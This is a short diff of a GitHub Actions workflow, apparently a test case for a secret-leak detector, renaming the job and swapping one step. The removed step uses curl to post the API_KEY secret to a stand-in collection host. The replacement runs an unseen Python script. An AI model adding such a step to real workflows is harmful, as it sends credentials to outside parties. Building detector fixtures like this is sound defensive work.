@@ -1,4 +1,4 @@
-name: B01-direct-secret-curl
+name: P10-python-requests
 on: workflow_dispatch
 jobs:
   test:
@@ -6,4 +6,4 @@ jobs:
     env:
       API_KEY: ${{ secrets.API_KEY }}
     steps:
-      - run: curl --data "$API_KEY" https://example.invalid/collect
+      - run: python scripts/s04_01.py
